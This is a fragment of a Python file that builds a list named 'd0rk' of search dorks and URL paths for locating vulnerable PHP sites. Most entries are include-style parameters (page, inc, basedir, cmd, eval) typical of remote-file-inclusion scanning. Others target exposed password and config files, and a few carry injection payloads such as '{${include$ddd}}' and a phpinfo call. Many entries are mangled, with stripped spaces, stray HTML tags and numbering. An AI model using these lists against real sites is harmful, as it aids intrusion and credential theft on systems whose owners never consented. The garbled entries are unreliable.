         '/newsdesk.cgi?alatest&t', '/newsdesk.cgi?t', '/newsdetail.php?file', '/newsletter/newsletter.php?waroot',
         '/newsupdate.cgi?alatest&t', '/nota.php?OpenPage', '/nota.php?abre', '/nota.php?adresa', '/nota.php?b',
         '/nota.php?basedir', '/nota.php?basepath', '/nota.php?category', '/nota.php?channel', '/nota.php?chapter',
         '/nota.php?cmd', '/nota.php?content', '/nota.php?corpo', '/nota.php?destino', '/nota.php?disp',
         '/nota.php?doshow', '/nota.php?eval', '/nota.php?filepath', '/nota.php?get', '/nota.php?goFile', '/nota.php?h',
         '/nota.php?header', '/nota.php?home', '/nota.php?in', '/nota.php?inc', '/nota.php?include', '/nota.php?ir',
         '/nota.php?itemnav', '/nota.php?ki', '/nota.php?lang', '/nota.php?left', '/nota.php?link', '/nota.php?m',
         '/nota.php?mid', '/nota.php?mod', '/nota.php?modo', '/nota.php?module', '/nota.php?n', '/nota.php?nivel',
         '/nota.php?oldal', '/nota.php?opcion', '/nota.php?option', '/nota.php?pag', '/nota.php?pagina',
         '/nota.php?panel', '/nota.php?pg', '/nota.php?play', '/nota.php?poll', '/nota.php?pr', '/nota.php?pre',
         '/nota.php?qry', '/nota.php?rub', '/nota.php?sec', '/nota.php?secc', '/nota.php?seccion', '/nota.php?second',
         '/nota.php?seite', '/nota.php?sekce', '/nota.php?showpage', '/nota.php?subject', '/nota.php?t',
         '/nota.php?tipo', '/nota.php?url', '/nota.php?v', '/noticias.php?arq', '/nuboardv0.5/admin/index.php?site',
         '/nuseo/admin/nuseoadmind.php?nuseodir', '/ocp103/index.php?reqpath', '/oldreports.php?file',
         '/openiadmin/base/fileloader.php?config[openidir]', '/order.php?l', '/order.php?lang', '/order.php?list',
         '/order.php?ln', '/order.php?p', '/order.php?pag', '/order.php?page', '/order.php?pg', '/order.php?wp',
         '/order/login.php?svrrootscript', '/os/pointer.php?url',
         '/osticket/include/main.php?config[searchdisp]true&includedir', '/p.php?p', '/padrao.php?',
         '/padrao.php?OpenPage', '/padrao.php?[]', '/padrao.php?a', '/padrao.php?abre', '/padrao.php?addr',
         '/padrao.php?basedir', '/padrao.php?basepath', '/padrao.php?c', '/padrao.php?choix', '/padrao.php?cont',
         '/padrao.php?corpo', '/padrao.php?d', '/padrao.php?destino', '/padrao.php?eval', '/padrao.php?filepath',
         '/padrao.php?h', '/padrao.php?header', '/padrao.php?incl', '/padrao.php?index', '/padrao.php?ir',
         '/padrao.php?link', '/padrao.php?loc', '/padrao.php?menu', '/padrao.php?menue', '/padrao.php?mid',
         '/padrao.php?middle', '/padrao.php?n', '/padrao.php?nivel', '/padrao.php?o', '/padrao.php?oldal',
         '/padrao.php?op', '/padrao.php?open', '/padrao.php?p', '/padrao.php?pag', '/padrao.php?page',
         '/padrao.php?path', '/padrao.php?pre', '/padrao.php?qry', '/padrao.php?read', '/padrao.php?redirect',
         '/padrao.php?root', '/padrao.php?rub', '/padrao.php?secao', '/padrao.php?secc', '/padrao.php?seccion',
         '/padrao.php?section', '/padrao.php?seite', '/padrao.php?sekce', '/padrao.php?sivu', '/padrao.php?str',
         '/padrao.php?strona', '/padrao.php?subject', '/padrao.php?tipo', '/padrao.php?type', '/padrao.php?u',
         '/padrao.php?url', '/padrao.php?var', '/padrao.php?xlink', '/page.php5?id', '/page.php?OpenPage',
         '/page.php?[]', '/page.php?abre', '/page.php?action', '/page.php?addr', '/page.php?adresa', '/page.php?arq',
         '/page.php?basedir', '/page.php?chapter', '/page.php?choix', '/page.php?cmd', '/page.php?cont',
         '/page.php?doc', '/page.php?e', '/page.php?ev', '/page.php?eval', '/page.php?g', '/page.php?go',
         '/page.php?goto', '/page.php?inc', '/page.php?incl', '/page.php?ir', '/page.php?left', '/page.php?link',
         '/page.php?ln', '/page.php?load', '/page.php?loader', '/page.php?mid', '/page.php?middle', '/page.php?mod',
         '/page.php?modo', '/page.php?module', '/page.php?numero', '/page.php?oldal', '/page.php?option', '/page.php?p',
         '/page.php?pa', '/page.php?panel', '/page.php?phpbbrootpath', '/page.php?pref', '/page.php?q', '/page.php?qry',
         '/page.php?read', '/page.php?recipe', '/page.php?redirect', '/page.php?s', '/page.php?secao',
         '/page.php?section', '/page.php?seite', '/page.php?showpage', '/page.php?sivu', '/page.php?strona',
         '/page.php?subject', '/page.php?tipo', '/page.php?url', '/page.php?view', '/page.php?where', '/page.php?z',
         '/pages.php?page', '/pagina.php?OpenPage', '/pagina.php?basedir', '/pagina.php?basepath',
         '/pagina.php?category']
d0rk += ['/pagina.php?channel', '/pagina.php?chapter', '/pagina.php?choix', '/pagina.php?cmd', '/pagina.php?dir',
         '/pagina.php?ev', '/pagina.php?filepath', '/pagina.php?g', '/pagina.php?go', '/pagina.php?goto',
         '/pagina.php?header', '/pagina.php?home', '/pagina.php?id', '/pagina.php?in', '/pagina.php?incl',
         '/pagina.php?include', '/pagina.php?index', '/pagina.php?ir', '/pagina.php?k', '/pagina.php?lang',
         '/pagina.php?left', '/pagina.php?link', '/pagina.php?load', '/pagina.php?loader', '/pagina.php?loc',
         '/pagina.php?mid', '/pagina.php?middlePart', '/pagina.php?modo', '/pagina.php?my', '/pagina.php?n',
         '/pagina.php?nivel', '/pagina.php?numero', '/pagina.php?oldal', '/pagina.php?pagina', '/pagina.php?panel',
         '/pagina.php?path', '/pagina.php?pr', '/pagina.php?pre', '/pagina.php?q', '/pagina.php?read',
         '/pagina.php?recipe', '/pagina.php?ref', '/pagina.php?sec', '/pagina.php?secao', '/pagina.php?seccion',
         '/pagina.php?section', '/pagina.php?sekce', '/pagina.php?start', '/pagina.php?str', '/pagina.php?thispage',
         '/pagina.php?tipo', '/pagina.php?to', '/pagina.php?type', '/pagina.php?u', '/pagina.php?v', '/pagina.php?z',
         '/paginedinamiche/main.php?pagina', '/palportal/index.php?page', '/palportal/index.php?page/palportal/',
         '/palportal/index.php?pagepalportal', '/passwd', '/passwd.txt', '/password', '/password.txt', '/path.php?',
         '/path.php?[]', '/path.php?action', '/path.php?addr', '/path.php?adresa', '/path.php?category',
         '/path.php?channel', '/path.php?chapter', '/path.php?cmd', '/path.php?destino', '/path.php?disp',
         '/path.php?doshow', '/path.php?ev', '/path.php?eval', '/path.php?filepath', '/path.php?goto',
         '/path.php?header', '/path.php?home', '/path.php?id', '/path.php?in', '/path.php?incl', '/path.php?ir',
         '/path.php?left', '/path.php?link', '/path.php?load', '/path.php?loader', '/path.php?menue', '/path.php?mid',
         '/path.php?middle', '/path.php?middlePart', '/path.php?my', '/path.php?nivel', '/path.php?numero',
         '/path.php?opcion', '/path.php?option', '/path.php?p', '/path.php?page', '/path.php?panel', '/path.php?path',
         '/path.php?play', '/path.php?pre', '/path.php?pref', '/path.php?qry', '/path.php?recipe', '/path.php?sec',
         '/path.php?secao', '/path.php?sivu', '/path.php?sp', '/path.php?start', '/path.php?strona',
         '/path.php?subject', '/path.php?thispage', '/path.php?tipo', '/path.php?type', '/path.php?var',
         '/path.php?where', '/path.php?xlink', '/path.php?y', '/path/index.php?functioncustom&custom',
         '/pathofcpcommerce/functions.php?prefix', '/phfito/phfitopost?SRCPATH',
         '/phorum/plugin/replace/plugin.php?PHORUM[settingsdir]', '/photoalb/lib/static/header.php?setmenu',
         '/phpcoin/config.php?CCFG[PKGPATHDBSE]', '/phpffl/phpfflfiles/programfiles/livedraft/admin.php?PHPFFLFILEROOT',
         '/phpffl/phpfflfiles/programfiles/livedraft/livedraft.php?PHPFFLFILEROOT',
         '/phpgwapi/setup/tablesupdate.inc.php?appdir', '/phphtml.php?htmlclasspath',
         '/phplivehelper/initiate.php?abspath', '/phpopenchat/contrib/yabbse/poc.php?sourcedir',
         '/phprojekt/lib/config.inc.php?pathpre', '/phprojekt/lib/gpcsvars.inc.php?pathpre',
         '/phprojekt/lib/layout/venus/venus.php?pathpre', '/phprojekt/lib/lib.inc.php?pathpre',
         '/phpsecurityadmin/include/logout.php?PSAPATH', '/phpshop/index.php?basedir',
         '/phpwcms/include/incext/spaw/dialogs/table.php?spawroot',
         '/phpwcmstemplate/incscript/frontendrender/navigation/configHTMLMENU.php?HTMLMENUDirPath',
         '/phpwcmstemplate/incscript/frontendrender/navigation/configPHPLM.php?HTMLMENUDirPath',
         '/pivot/modules/moduledb.php?pivotpath', '/pm/lib.inc.php?pmpath', '/poll/admin/common.inc.php?basepath',
         '/poll/comments.php?id{${include$ddd}}{${exit}}&ddd', '/pollvote/pollvote.php?pollname', '/pop.php?base',
         '/popupwindow.php?siteisproot', '/port.php?content', '/powerup.cgi?alatest&t',
         '/ppa/inc/functions.inc.php?config[pparootpath]', '/prepare.php?xcartdir', '/press.php?OpenPage',
         '/press.php?[]', '/press.php?abre', '/press.php?addr', '/press.php?basedir', '/press.php?category',
         '/press.php?channel', '/press.php?destino', '/press.php?dir', '/press.php?ev', '/press.php?get',
         '/press.php?goFile', '/press.php?home', '/press.php?i', '/press.php?id', '/press.php?inc', '/press.php?incl',
         '/press.php?include', '/press.php?ir', '/press.php?itemnav', '/press.php?lang', '/press.php?link',
         '/press.php?loader', '/press.php?menu', '/press.php?mid', '/press.php?middle', '/press.php?modo',
         '/press.php?module', '/press.php?my', '/press.php?nivel', '/press.php?opcion', '/press.php?option',
         '/press.php?p', '/press.php?pa', '/press.php?page', '/press.php?pagina', '/press.php?panel',
         '/press.php?param', '/press.php?path', '/press.php?pg', '/press.php?pr', '/press.php?pref',
         '/press.php?redirect', '/press.php?root', '/press.php?rub', '/press.php?second', '/press.php?seite',
         '/press.php?strona', '/press.php?subject', '/press.php?t', '/press.php?thispage', '/press.php?to',
         '/press.php?type', '/press.php?where', '/press.php?xlink', '/presse.php?do', '/principal.php?abre',
         '/principal.php?addr', '/principal.php?b', '/principal.php?basepath', '/principal.php?choix',
         '/principal.php?cont', '/principal.php?conteudo', '/principal.php?corpo']
d0rk += ['/principal.php?d', '/principal.php?destino', '/principal.php?disp', '/principal.php?ev',
         '/principal.php?eval', '/principal.php?f', '/principal.php?filepath', '/principal.php?goto',
         '/principal.php?header', '/principal.php?home', '/principal.php?id', '/principal.php?in', '/principal.php?inc',
         '/principal.php?index', '/principal.php?ir', '/principal.php?ki', '/principal.php?l', '/principal.php?left',
         '/principal.php?link', '/principal.php?load', '/principal.php?loader', '/principal.php?loc',
         '/principal.php?menue', '/principal.php?middle', '/principal.php?middlePart', '/principal.php?module',
         '/principal.php?my', '/principal.php?n', '/principal.php?nivel', '/principal.php?oldal',
         '/principal.php?opcion', '/principal.php?p', '/principal.php?pag', '/principal.php?pagina',
         '/principal.php?param', '/principal.php?phpbbrootpath', '/principal.php?poll', '/principal.php?pr',
         '/principal.php?pre', '/principal.php?pref', '/principal.php?q', '/principal.php?read',
         '/principal.php?recipe', '/principal.php?ref', '/principal.php?rub', '/principal.php?s', '/principal.php?secc',
         '/principal.php?seccion', '/principal.php?seite', '/principal.php?strona', '/principal.php?subject',
         '/principal.php?tipo', '/principal.php?to', '/principal.php?type', '/principal.php?url',
         '/principal.php?viewpage', '/principal.php?w', '/principal.php?z', '/print.php?', '/print.php?OpenPage',
         '/print.php?addr', '/print.php?basedir', '/print.php?basepath', '/print.php?category', '/print.php?chapter',
         '/print.php?choix', '/print.php?cont', '/print.php?dir', '/print.php?disp', '/print.php?doshow',
         '/print.php?g', '/print.php?goFile', '/print.php?goto', '/print.php?header', '/print.php?in', '/print.php?inc',
         '/print.php?itemnav', '/print.php?ki', '/print.php?l', '/print.php?left', '/print.php?link', '/print.php?loc',
         '/print.php?menu', '/print.php?menue', '/print.php?middle', '/print.php?middlePart', '/print.php?module',
         '/print.php?my', '/print.php?numero', '/print.php?opcion', '/print.php?open', '/print.php?option',
         '/print.php?p', '/print.php?pag', '/print.php?page', '/print.php?pager', '/print.php?param', '/print.php?path',
         '/print.php?play', '/print.php?poll', '/print.php?pre', '/print.php?r', '/print.php?read', '/print.php?root',
         '/print.php?rub', '/print.php?s', '/print.php?sekce', '/print.php?sivu', '/print.php?sp', '/print.php?str',
         '/print.php?strona', '/print.php?table', '/print.php?thispage', '/print.php?tipo', '/print.php?type',
         '/print.php?u', '/print.php?where', '/prod.php?prod', '/proddetail.php?prod', '/products.php?prod',
         '/produit.php?prod', '/produkt.php?prod', '/protection.php?actionlogout&siteurl',
         '/provider/auth.php?xcartdir', '/publicincludes/pubblocks/activecontent.php?vsDragonRootPath', '/publisher/',
         '/read.php?fpage', '/read.php?fpage/read.php?fpage', '/reporter.cgi?t', '/reports.php?sub',
         '/rss.php?phpraiddir', '/s.php?table', '/s1.php?ln', '/samples/search/queryhit.htm', '/scan',
         '/scripts/CGImail.exe', '/scripts/convert.bas', '/scripts/counter.exe', '/scripts/cpshost.dll',
         '/scripts/fpcount.exe', '/scripts/iisadmin/bdir.htr', '/scripts/iisadmin/ism.dll',
         '/scripts/iisadmin/tools/ctss.idc', '/scripts/iisadmin/tools/getdrvrs.exe',
         '/scripts/iisadmin/tools/mkilog.exe', '/scripts/issadmin/bdir.htr', '/scripts/perl', '/scripts/postinfo.asp',
         '/scripts/proxy/w3proxy.dll', '/scripts/samples/ctguestb.idc', '/scripts/samples/details.idc',
         '/scripts/samples/search/webhits.exe', '/scripts/tools/dsnform.exe', '/scripts/tools/getdrvrs.exe',
         '/scripts/tools/getdrvs.exe', '/scripts/tools/newdsn.exe', '/scripts/upload.asp', '/scripts/uploadn.asp',
         '/scripts/uploadx.asp', '/search', '/search.php?cutepath', '/search.php?exec', '/search97.vts',
         '/secure/.htaccess', '/secure/acl', '/sendpage.php?page', '/sendreminders.php?includedir',
         '/senetman/html/index.php?page', '/services.php?page', '/session/adminlogin', '/shop.cgi/page|/shop.pl/page',
         '/shop.php?prod', '/shop.pl/page', '/shoutbox/expanded.php?conf', '/show.php?abre', '/show.php?adresa',
         '/show.php?b', '/show.php?basedir', '/show.php?channel', '/show.php?chapter', '/show.php?cmd',
         '/show.php?corpo', '/show.php?d', '/show.php?disp', '/show.php?file', '/show.php?filepath', '/show.php?get',
         '/show.php?go', '/show.php?header', '/show.php?home', '/show.php?inc', '/show.php?incl', '/show.php?include',
         '/show.php?index', '/show.php?ir', '/show.php?j', '/show.php?ki', '/show.php?l', '/show.php?left',
         '/show.php?loader', '/show.php?m', '/show.php?mid', '/show.php?middlePart', '/show.php?modo',
         '/show.php?module', '/show.php?my', '/show.php?n', '/show.php?nivel', '/show.php?oldal', '/show.php?p',
         '/show.php?page', '/show.php?page1', '/show.php?pagina', '/show.php?param', '/show.php?path', '/show.php?play',
         '/show.php?pre', '/show.php?product', '/show.php?qry', '/show.php?r', '/show.php?read', '/show.php?recipe',
         '/show.php?redirect', '/show.php?root', '/show.php?seccion', '/show.php?second', '/show.php?sp',
         '/show.php?thispage', '/show.php?to', '/show.php?type', '/show.php?x', '/show.php?xlink', '/show.php?z',
         '/showfile.asp', '/shownews.php?cutepath', '/side.php?arq', '/side.php?table']
d0rk += ['/side.php?vis', '/side/index.php?side', '/site.php?arq', '/site.php?meio', '/site.php?table', '/sitio.php?',
         '/sitio.php?abre', '/sitio.php?addr', '/sitio.php?category', '/sitio.php?chapter', '/sitio.php?content',
         '/sitio.php?destino', '/sitio.php?disp', '/sitio.php?doshow', '/sitio.php?e', '/sitio.php?ev',
         '/sitio.php?get', '/sitio.php?go', '/sitio.php?goFile', '/sitio.php?inc', '/sitio.php?incl',
         '/sitio.php?index', '/sitio.php?ir', '/sitio.php?left', '/sitio.php?menu', '/sitio.php?menue',
         '/sitio.php?mid', '/sitio.php?middlePart', '/sitio.php?modo', '/sitio.php?nivel', '/sitio.php?o',
         '/sitio.php?oldal', '/sitio.php?opcion', '/sitio.php?option', '/sitio.php?page', '/sitio.php?param',
         '/sitio.php?pg', '/sitio.php?pr', '/sitio.php?qry', '/sitio.php?r', '/sitio.php?read', '/sitio.php?recipe',
         '/sitio.php?redirect', '/sitio.php?root', '/sitio.php?rub', '/sitio.php?sec', '/sitio.php?secao',
         '/sitio.php?secc', '/sitio.php?section', '/sitio.php?sivu', '/sitio.php?sp', '/sitio.php?start',
         '/sitio.php?strona', '/sitio.php?t', '/sitio.php?tipo', '/skin/zerovote/askpassword.php?dir',
         '/skin/zerovote/error.php?dir', '/skin/zerovote/error.php?dirskin/zerovote/error.php',
         '/skins/advanced/advanced1.php?pluginpath[0]', '/slxweb.dll/external?namecustportal|webticketcust',
         '/smarty.php?xcartdir', '/smartyconfig.php?rootdir', '/smdata.dat', '/solpot.html?',
         '/source/mod/rss/channeledit.php?Codebase', '/source/mod/rss/post.php?Codebase',
         '/source/mod/rss/view.php?Codebase', '/source/mod/rss/viewitem.php?Codebase',
         '/sources/functions.php?CONFIG[mainpath]', '/sources/functions.php?CONFIG[mainpath]PoweredByScozNews',
         '/sources/functions.php?CONFIG[mainpath]ScozNews',
         '/sources/join.php?FORM[url]owned&CONFIG[captcha]1&CONFIG[path]',
         '/sources/join.php?FORM[url]owned&CONFIG[captcha]1&CONFIG[path]Aardvark',
         '/sources/join.php?FORM[url]owned&CONFIG[captcha]1&CONFIG[path]AardvarkTopSites',
         '/sources/join.php?FORM[url]owned&CONFIG[captcha]1&CONFIG[path]PoweredByAardvarkTopsitesPHP4.2.2',
         '/sources/post.php?filconfig', '/sources/template.php?CONFIG[mainpath]',
         '/sources/template.php?CONFIG[mainpath]PoweredByScozNews', '/sources/template.php?CONFIG[mainpath]ScozNews',
         '/spid/lang/lang.php?langpath', '/squirrelcart/cartcontent.php?cartisproot',
         '/squito/photolist.inc.php?photoroot', '/ssi/envout.bat', '/standard.php?', '/standard.php?[]',
         '/standard.php?abre', '/standard.php?action', '/standard.php?basedir', '/standard.php?channel',
         '/standard.php?chapter', '/standard.php?cmd', '/standard.php?cont', '/standard.php?destino',
         '/standard.php?dir', '/standard.php?e', '/standard.php?ev', '/standard.php?eval', '/standard.php?go',
         '/standard.php?goFile', '/standard.php?goto', '/standard.php?home', '/standard.php?in',
         '/standard.php?include', '/standard.php?index', '/standard.php?j', '/standard.php?lang', '/standard.php?link',
         '/standard.php?menu', '/standard.php?middle', '/standard.php?my', '/standard.php?numero',
         '/standard.php?oldal', '/standard.php?op', '/standard.php?open', '/standard.php?pagina', '/standard.php?panel',
         '/standard.php?param', '/standard.php?phpbbrootpath', '/standard.php?poll', '/standard.php?pr',
         '/standard.php?pre', '/standard.php?pref', '/standard.php?q', '/standard.php?qry', '/standard.php?ref',
         '/standard.php?s', '/standard.php?secc', '/standard.php?seccion', '/standard.php?section',
         '/standard.php?showpage', '/standard.php?sivu', '/standard.php?str', '/standard.php?subject',
         '/standard.php?url', '/standard.php?var', '/standard.php?viewpage', '/standard.php?w', '/standard.php?where',
         '/standard.php?xlink', '/standard.php?z', '/start.php?', '/start.php?abre', '/start.php?addr',
         '/start.php?adresa', '/start.php?b', '/start.php?basedir', '/start.php?basepath', '/start.php?chapter',
         '/start.php?cmd', '/start.php?corpo', '/start.php?destino', '/start.php?eval', '/start.php?go',
         '/start.php?header', '/start.php?home', '/start.php?id', '/start.php?in', '/start.php?include',
         '/start.php?index', '/start.php?ir', '/start.php?lang', '/start.php?load', '/start.php?loader',
         '/start.php?mid', '/start.php?mod', '/start.php?modo', '/start.php?module', '/start.php?nivel', '/start.php?o',
         '/start.php?oldal', '/start.php?op', '/start.php?option', '/start.php?p', '/start.php?pag', '/start.php?page',
         '/start.php?panel', '/start.php?param', '/start.php?pg', '/start.php?play', '/start.php?poll',
         '/start.php?root', '/start.php?rub', '/start.php?s', '/start.php?secao', '/start.php?seccion',
         '/start.php?seite', '/start.php?showpage', '/start.php?sivu', '/start.php?sp', '/start.php?str',
         '/start.php?strona', '/start.php?thispage', '/start.php?tipo', '/start.php?where', '/start.php?xlink',
         '/static.php?load', '/stphpapplication.php?STPHPLIBDIR', '/stphpbtnimage.php?STPHPLIBDIR',
         '/stphpform.php?STPHPLIBDIR', '/str.php?l', '/str.php?lang', '/str.php?ln', '/str.php?p', '/str.php?page',
         '/sub.php?', '/sub.php?OpenPage', '/sub.php?[]', '/sub.php?abre', '/sub.php?action', '/sub.php?adresa',
         '/sub.php?b', '/sub.php?basedir', '/sub.php?basepath', '/sub.php?category', '/sub.php?channel',
         '/sub.php?chapter', '/sub.php?cont', '/sub.php?content', '/sub.php?corpo']
d0rk += ['/sub.php?destino', '/sub.php?g', '/sub.php?go', '/sub.php?goFile', '/sub.php?header', '/sub.php?id',
         '/sub.php?include', '/sub.php?ir', '/sub.php?itemnav', '/sub.php?j', '/sub.php?k', '/sub.php?lang',
         '/sub.php?left', '/sub.php?link', '/sub.php?load', '/sub.php?menu', '/sub.php?menue', '/sub.php?mid',
         '/sub.php?middle', '/sub.php?mod', '/sub.php?modo', '/sub.php?module', '/sub.php?my', '/sub.php?oldal',
         '/sub.php?op', '/sub.php?open', '/sub.php?option', '/sub.php?p', '/sub.php?pa', '/sub.php?pag',
         '/sub.php?panel', '/sub.php?path', '/sub.php?phpbbrootpath', '/sub.php?play', '/sub.php?pre', '/sub.php?qry',
         '/sub.php?recipe', '/sub.php?root', '/sub.php?rub', '/sub.php?s', '/sub.php?sec', '/sub.php?secao',
         '/sub.php?secc', '/sub.php?seite', '/sub.php?sp', '/sub.php?str', '/sub.php?sub', '/sub.php?thispage',
         '/sub.php?u', '/sub.php?viewpage', '/sub.php?where', '/sub.php?z', '/support/faq/inc/pipe.php?HCLpath',
         '/support/mailling/maillist/inc/initdb.php?absolutepath', '/supportpage.cgi?file',
         '/surveys/survey.inc.php?path', '/surveys/survey.inc.php?pathsurveys', '/tags.php?BBCodeFile',
         '/tags.php?BBCodeFileTaggerLE', '/tags.php?BBCodeFileTaggerLEtags.php', '/tags.php?BBCodeFiletags.php',
         '/task.php?task', '/tellmatic/include/libchart1.1/libchart.php?tmincludepath',
         '/tempeg/phpgwapi/setup/tablesupdate.inc.php?appdir', '/template.php?', '/template.php?[]', '/template.php?a',
         '/template.php?addr', '/template.php?basedir', '/template.php?basepath', '/template.php?c',
         '/template.php?choix', '/template.php?cont', '/template.php?content', '/template.php?corpo',
         '/template.php?dir', '/template.php?doshow', '/template.php?e', '/template.php?f', '/template.php?goto',
         '/template.php?h', '/template.php?header', '/template.php?ir', '/template.php?k', '/template.php?lang',
         '/template.php?left', '/template.php?load', '/template.php?menue', '/template.php?mid', '/template.php?mod',
         '/template.php?nivel', '/template.php?o', '/template.php?op', '/template.php?opcion', '/template.php?pag',
         '/template.php?page', '/template.php?pagina', '/template.php?panel', '/template.php?param',
         '/template.php?path', '/template.php?play', '/template.php?pre', '/template.php?qry', '/template.php?ref',
         '/template.php?s', '/template.php?secao', '/template.php?second', '/template.php?section',
         '/template.php?seite', '/template.php?sekce', '/template.php?showpage', '/template.php?sp',
         '/template.php?str', '/template.php?t', '/template.php?thispage', '/template.php?tipo',
         '/template.php?viewpage', '/template.php?where', '/template.php?y', '/templates/headlinetemp.php?nstinc',
         '/templates/headlinetemp.php?nstincfusion', '/templates/headlinetemp.php?nstincfusionnewsmanagement',
         '/templates/headlinetemp.php?nstincfusionnewsmanagementsystem', '/templates/headlinetemp.php?nstincmanagement',
         '/templates/headlinetemp.php?nstincnews', '/templates/headlinetemp.php?nstincsystem',
         '/templates/mangobery/footer.sample.php?SitePath', '/templates/mangobery/footer.sample.php?SitePathMangobery',
         '/templates/mangobery/footer.sample.php?SitePathMangobery0.5.5', '/test.php?page',
         '/tikiwiki/tikigraphformula.php?w1&h1&s1&min1&max2&f[]x.tan.phpinfo&tpng&title', '/today.nsf',
         '/tools/sendreminders.php?includedir', '/tools/sendreminders.php?includedirallday.php?date',
         '/tools/sendreminders.php?includedirday.php?date', '/tools/sendreminders.php?noSet0&includedir',
         '/trans.php?trans', '/trans/trans.php?trans&p', '/trans/trans.php?trans&page',
         '/trans/trans.php?trans&pagephp?trans', '/trans/trans.php?trans&pphp?trans', '/trans/trans.php?transen&page',
         '/trans/trans.php?transen&pagephp?trans', '/trans/trans.php?transeng&page',
         '/trans/trans.php?transeng&pagephp?trans', '/trans/trans.php?transfr&page',
         '/trans/trans.php?transfr&pagephp?trans', '/trans/trans.php?transko&page',
         '/trans/trans.php?transko&pagephp?trans', '/tree.dat', '/tsep/include/colorswitch.php?tsepconfig[absPath]',
         '/tutorials/print.php?page', '/video.php?content', '/view.php?', '/view.php?[]', '/view.php?adresa',
         '/view.php?b', '/view.php?channel', '/view.php?chapter', '/view.php?choix', '/view.php?cmd',
         '/view.php?content', '/view.php?disp', '/view.php?get', '/view.php?go', '/view.php?goFile', '/view.php?goto',
         '/view.php?header', '/view.php?incl', '/view.php?ir', '/view.php?ki', '/view.php?lang', '/view.php?load',
         '/view.php?loader', '/view.php?mid', '/view.php?middle', '/view.php?mod', '/view.php?oldal',
         '/view.php?option', '/view.php?pag', '/view.php?page', '/view.php?panel', '/view.php?pg',
         '/view.php?phpbbrootpath', '/view.php?poll', '/view.php?pr', '/view.php?qry', '/view.php?recipe',
         '/view.php?redirect', '/view.php?sec', '/view.php?secao', '/view.php?seccion', '/view.php?second',
         '/view.php?seite', '/view.php?showpage', '/view.php?sp', '/view.php?str', '/view.php?sub', '/view.php?table',
         '/view.php?to', '/view.php?type', '/view.php?u', '/view.php?var', '/view.php?where', '/voir.php?inc',
         '/webedit.intextWebEditProfessionalhtml', '/ws/getevents.php?includedir',
         '/ws/getevents.php?includedir/WebCalendar/', '/ws/getevents.php?includedirWebCalendar',
         '/ws/getevents.php?includedirWebCalendarv0.9.45']
d0rk += ['/ws/getreminders.php?includedir', '/ws/getreminders.php?includedirWebCalendar',
         '/ws/getreminders.php?includedirWebCalendarv0.9.45', '/ws/login.php?includedir',
         '/ws/login.php?includedirWebCalendar', '/ws/login.php?includedirWebCalendarv0.9.45', '/wsftp.ini', '/board',
         '/board/passwd.txt</div></pre>', '/yabb/Members/Admin.dat', '/yabbse/Sources/Packages.php?sourcedir',
         '/zentrack/index.php?configFile', '/zipndownload.php?PPPATH', '/zipndownload.php?PPPATHPhotoPost',
         '/zipndownload.php?PPPATHPhotoPostP', '/zipndownload.php?PPPATHPhotoPostPHP',
         '/zipndownload.php?PPPATHPhotoPostPHP4.6', '/zipndownload.php?PPPATHPoweredbyPhotoPostPHP4.6',
         '02/forumtopic.php?id', '0x3aversion', '1.myegerysite.org', '10.googlekietu/hitjs.phpkietu/hitjs.php',
         '10000intextwebmin', '10000?intextwebmin', '11.keywordPoweredbyphpBB2.0.6', '12.keywordpoweredbyCubeCart3.0.6',
         '1220/parsexml.cgi?', '13.keywordpoweredbypaBugs2.0Beta3', '14.keywordpoweredeyeOs',
         '14.poweredbyAshNewsAshNewsatau/ashnews.php', '15..php?bodyfile', '15.keyword/phorum/login.php',
         '16./includes/orderSuccess.inc.php?glob', '16.ihm.php?p', '17.forums.html', '18./default.php?pagehome',
         '1810OracleEnterpriseManager', '19./folder.php?id', '2.xgerysite.org', '20.main.php?pagina',
         '2000RemotelyAnywheresiterealvnc.com', '2082/frontenddemo', '737en.php?id', '8./modules.php?namemyguests',
         '8003/Display?what', '8080312880filetypetxt', '8080?3128?80?filetypetxt', '9./Popper/index.php?',
         '94FBRADOBEPHOTOSHOP', '</div></pre>', '<divstylemargin3px>', '?act', '?action', '?cat', '?id',
         '?index.of?mp3NOMEARTISTA', '?index.of?mp3name', '?page', '?pagerequested', '?pid', 'ADSLConfigurationpage',
         'AIMbuddylists', 'APIHOMEDIR', 'ARDetail.asp?ID', 'ASP.NETSessionIddatasource',
         'ASP.loginaspxASP.NETSessionId', 'ASPDORK', 'ASPStatsGenerator.ASPStatsGenerator20032004weppos', 'ATadmin.cgi',
         'ATgenerate.cgi', 'AboutMacOSPersonalWebSharing', 'Activex/default.htmDemo', 'AdminLoginadminloginblogware',
         'AdminloginWebSiteAdministrationCopyright', 'AlternCDesktop', 'AnalysisConsoleforIncidentDatabases',
         'Anillegalcharacterhasbeenfoundinthestatementpreviousmessage', 'AnunexpectedtokenENDOFSTATEMENTwasfound',
         'AnyBoardIfyouareanewuserintextForum', 'AnyBoardgochatedu', 'ApacheStatusApacheServerStatusfor',
         'ApacheStatusserverstatus|status.html|apache.html', 'ApacheTomcatErrorReport',
         'AppServOpenProjectsite.appservnetwork.com', 'Asyntaxerrorhasoccurredfiletypeihtml',
         'AthensAuthenticationPoint', 'AutoCreateTRUEpassword', 'AzureusJavaBitTorrentClientTracker', 'BNBTTrackerInfo',
         'BelarcAdvisorCurrentProfileintextClickhereforBelarcsPCManagementproductsforlargeandsmallcompanies.',
         'BelarcAdvisorCurrentProfileintextClickhereforBelarc?sPCManagementproductsforlargeandsmallcompanies.',
         'BiTBOARDv2.0BiTSHiFTERSBulletinBoard', 'BigSisterOKAttentionTrouble', 'Blog/viewpost.php?id',
         'Book.asp?bookID', 'Book.cfm?bookID', 'Book.php?bookID', 'BookDetails.asp?ID', 'BookDetails.cfm?ID',
         'BookDetails.php?ID', 'Bookmarksbookmarks.htmlBookmarks', 'BrowseItemDetails.asp?StoreId',
         'BrowseItemDetails.cfm?StoreId', 'BrowseItemDetails.php?StoreId', 'BrowserLaunchPage', 'CGIIRCLogin',
         'CURRENTUSERusernameusernamesandotherinformat', 'CanonWebviewnetcams', 'Cantconnecttolocalwarning',
         'Can?tconnecttolocalwarning', 'CatalogViewSummary.php?ID', 'CertificatePracticeStatementPDF|DOC',
         'CertificatePracticeStatementfiletypePDF|DOC', 'ChatologicaMetaSearchstacktracking',
         'CiscoCallManagerUserOptionsLogOnPleaseenteryourUserIDandPasswordinthespacesprovidedbelowandclicktheLogOnbuttontoco',
         'Citrix/MetaFrame/default/default.aspx', 'Code', 'ColdFusionAdministratorLogin', 'ColdfusionErrorPages',
         'Comersus.mdbdatabase', 'Company%20Info.php?id', 'ComputerScience.asp?id', 'ComputerScience.php?id',
